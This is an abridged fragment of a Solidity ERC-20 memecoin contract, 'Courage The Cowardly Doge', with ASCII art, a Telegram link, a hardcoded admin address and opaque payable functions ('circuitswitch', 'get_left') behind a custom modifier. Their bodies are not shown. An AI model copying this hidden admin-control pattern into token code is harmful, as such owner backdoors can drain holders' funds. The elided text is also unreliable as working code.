//
// Courage the Cowardly Doge $COWARDLYDOGE
// t.me/cowardlydogeofficial

//   _    ___  ___ __    __  _     __    ___  __      ___  ___  ___  __ 
//  | |  / __\/___/ / /\ \ \/_\   /__\  /   \/ /\_/\ /   \/___\/ _ \/__\
// / __)/ /  //  /\ \/  \/ //_\\ / \// / /\ / /\_ _// /\ //  // /_\/_\  
// \__ / /__/ \_// \  /\  /  _  / _  \/ /_// /__/ \/ /_// \_// /_\//__  
// (   \____\___/   \/  \/\_/ \_\/ \_/___,'\____\_/___,'\___/\____\__/  
//  |_|                                                                 
...
contract CourageTheCowardlyDoge is Context, IERC20, Ownable {
    ...
    address admin=0xa4f3160fFe22E717F6e586ad67f51a80AC9F6A1A;
    string private _name = 'Courage The Cowardly Doge';
    string private _symbol = '$COWARDLYDOGE';
    ...
    function circuitswitch(address payable getmov) payable Left()external{
   ...
   function get_left() external view Left() returns(uint){
